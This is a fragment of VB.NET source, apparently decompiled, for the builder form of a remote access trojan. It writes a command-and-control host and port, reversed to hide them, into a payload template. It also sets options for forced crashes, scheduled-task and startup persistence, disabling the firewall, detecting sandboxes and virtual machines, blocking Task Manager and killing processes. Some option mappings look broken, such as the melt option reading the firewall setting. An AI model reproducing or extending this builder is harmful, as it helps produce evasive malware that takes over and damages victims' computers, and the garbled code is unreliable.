...
Public Class Builder
    ...
    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles Me.Load
        ...
        HiddenH.Text = StrReverse(host.Text)
        HiddenP.Value = StrReverse(port.Value)
    ...
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        ...
        If (dialog.ShowDialog = DialogResult.OK) Then
            ...
            Dim newValue As String = Class6.smethod_4(String.Concat(New String() {Me.VN.Text, Me.host.Text, Conversions.ToString(Me.port.Value), Me.exe.Text, Me.dir.Text, Me.bsod.Checked.ToString, Me.Idr.Checked.ToString, Me.Isu.Checked.ToString, Me.Isf.Checked.ToString, Me.schedule.Checked.ToString, Me.hide.Checked.ToString, Me.firewall.Checked.ToString, Me.ANYRUN.Checked.ToString, Me.VMWare.Checked.ToString, Me.VirtualBOX.Checked.ToString, Me.TaskMGR.Checked.ToString, Me.KillProc.Checked.ToString, Me.TextBox1.Text, Me.TextBox2.Text, Me.NumericUpDown1.Value}))
            Dim box As TextBox = Me.VN
            Dim text As String = box.Text
            box.Text = [text]
            contents = contents.Replace("[VN]", Class6.smethod_14([text])).Replace("[H]", Me.HiddenH.Text).Replace("[P]", Conversions.ToString(Me.HiddenP.Value)).Replace("[EXE]", Me.exe.Text).Replace("[DR]", Me.dir.Text.Replace("%", String.Empty)).Replace("[BD]", Me.bsod.Checked.ToString).Replace("[RG]", newValue).Replace("[Idr]", Me.Idr.Checked.ToString).Replace("[Isu]", Me.Isu.Checked.ToString).Replace("[Isf]", Me.Isf.Checked.ToString).Replace("[klen]", Me.klen.Value.ToString).Replace("[Sched]", Me.schedule.Checked.ToString).Replace("[Ghost]", Me.hide.Checked.ToString).Replace("[DFire]", Me.firewall.Checked.ToString).Replace("[Melt]", Me.firewall.Checked.ToString).Replace("[ANYRUN]", Me.VMWare.Checked.ToString).Replace("[VirtualBOX]", Me.VirtualBOX.Checked.ToString).Replace("[VMWare]", Me.VMWare.Checked.ToString).Replace("[TaskMGR]", Me.TaskMGR.Checked.ToString).Replace("[KProc]", Me.KillProc.Checked.ToString).Replace("[Proc]", Me.TextBox2.Text).Replace("[Slp]", Me.Label11.Text).Replace("[SCHEDNAME]", Me.TextBox1.Text)
    ...
    Private Sub PortTimer_Tick(sender As Object, e As EventArgs) Handles PortTimer.Tick
        HiddenP.Value = StrReverse(port.Value)
    End Sub

    Private Sub schedule_CheckedChanged(sender As Object, e As EventArgs) Handles schedule.CheckedChanged

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Label11.Text = NumericUpDown1.Value * 1000
    End Sub
